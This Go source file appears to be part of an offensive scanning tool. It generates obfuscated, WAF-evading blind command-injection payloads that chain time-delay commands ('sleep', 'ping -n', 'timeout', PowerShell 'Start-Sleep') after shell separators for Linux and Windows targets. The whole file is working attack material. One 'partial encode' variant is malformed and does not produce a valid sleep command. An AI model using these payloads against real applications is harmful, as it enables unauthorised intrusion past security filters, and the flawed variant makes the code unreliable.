package blindrceengine

import (
	"fmt"
	"math/rand"
	"net/url"
)

// RCEPayload pairs an obfuscated command-injection payload with the OS class
// it targets.
type RCEPayload struct {
	Payload string
	OS      string
}

// GenerateRCEPayloads builds WAF-bypassing variants of a time-delay command
// for the given seconds delay. Never returns raw "sleep N" — always obfuscated.
func GenerateRCEPayloads(seconds int) []RCEPayload {
	s := fmt.Sprintf("%d", seconds)
	hex := func(b byte) string { return fmt.Sprintf("\\x%02x", b) }

	// Hex-encoded "sleep" for bash: \x73\x6c\x65\x65\x70
	sleepHex := ""
	for _, ch := range "sleep" {
		sleepHex += hex(byte(ch))
	}

	// Randomised inline variable split to bypass static WAF rules
	// e.g. s=sl;e=eep;$s$e 5  →  varies each call for entropy
	letters := []string{"sl", "sle", "slee"}
	pick := letters[rand.Intn(len(letters))]
	tail := "sleep"[len(pick):]

	pingN := fmt.Sprintf("%d", seconds+1) // ping -n (n) sends n-1 ICMP, so +1

	return []RCEPayload{
		// ── Linux / Unix ──────────────────────────────────────────────
		{fmt.Sprintf("sleep${IFS}%s", s), "linux"},
		{fmt.Sprintf("$(sleep${IFS}%s)", s), "linux"},
		{fmt.Sprintf("|sleep${IFS}%s", s), "linux"},
		{fmt.Sprintf(";sleep${IFS}%s", s), "linux"},
		{fmt.Sprintf("&sleep${IFS}%s&", s), "linux"},
		{fmt.Sprintf("$($'%s'${IFS}%s)", sleepHex, s), "linux"},            // hex encoded binary
		{fmt.Sprintf("a=%s;b=%s;$a$b %s", pick, tail, s), "linux"},         // inline var split
		{fmt.Sprintf("{sleep,${IFS}%s}", s), "linux"},                      // brace expansion
		{fmt.Sprintf("s%sleop${IFS}%s", url.QueryEscape("|"), s), "linux"}, // partial encode
		{fmt.Sprintf("$(printf 'sleep %s'|sh)", s), "linux"},               // printf+sh
		// ── Windows / PowerShell ──────────────────────────────────────
		{fmt.Sprintf("p^i^n^g -n %s 127.0.0.1", pingN), "windows"},             // cmd caret bypass
		{fmt.Sprintf("pi''ng -n %s 127.0.0.1", pingN), "windows"},              // empty string bypass
		{fmt.Sprintf("&ping -n %s 127.0.0.1", pingN), "windows"},               // ampersand chain
		{fmt.Sprintf("timeout /T %s /NOBREAK >nul", s), "windows"},             // timeout cmd
		{fmt.Sprintf("&('sl'+'eep') %s", s), "windows"},                        // PS string concat
		{fmt.Sprintf("[System.Threading.Thread]::Sleep(%s000)", s), "windows"}, // PS full sleep
		{fmt.Sprintf("powershell -c Start-Sleep -Seconds %s", s), "windows"},   // PS flag
	}
}
